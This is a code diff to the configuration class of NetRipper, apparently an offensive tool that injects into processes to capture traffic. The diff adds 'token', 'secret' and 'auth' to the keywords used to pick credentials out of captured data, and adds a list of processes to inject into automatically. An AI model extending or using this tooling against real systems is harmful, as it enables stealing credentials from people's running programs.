@@ -7,13 +7,14 @@
 string DynConfig::s_sDataPath     = "TEMP";
 string DynConfig::s_sPlainText    = "false";
 string DynConfig::s_sDataLimit    = "65535";
-string DynConfig::s_sStringFinder = "user,login,pass,config";
+string DynConfig::s_sStringFinder = "user,login,pass,config,token,secret,auth";
+string DynConfig::s_sProcessList = "";
 
 // Default settings
 
 string DynConfig::s_sConfigurationString = 
 	"<NetRipper><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>DEFAULT</stringfind"
-	"er><data_path>TEMP</data_path></NetRipper>----------------------------------------------------------"
+	"er><data_path>TEMP</data_path><processes></processes></NetRipper>-----------------------------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
@@ -31,6 +32,7 @@ void DynConfig::Init()
 	s_sPlainText    = Utils::GetStringBetween(s_sConfigurationString, "<plaintext>", "</plaintext>");
 	s_sDataLimit    = Utils::GetStringBetween(s_sConfigurationString, "<datalimit>", "</datalimit>");
 	s_sStringFinder = Utils::GetStringBetween(s_sConfigurationString, "<stringfinder>", "</stringfinder>");
+	s_sProcessList  = Utils::GetStringBetween(s_sConfigurationString, "<processes>", "</processes>");
 }
 
 // Get plaintext plugin config
@@ -52,6 +54,13 @@ string DynConfig::GetDataLimit()
 string DynConfig::GetStringFinder()
 {
 	return s_sStringFinder;
+}
+
+// Get process list to auto-inject
+
+string DynConfig::GetProcessList()
+{
+	return s_sProcessList;
 }
 
 // Get the data path, create folder if it does not exists
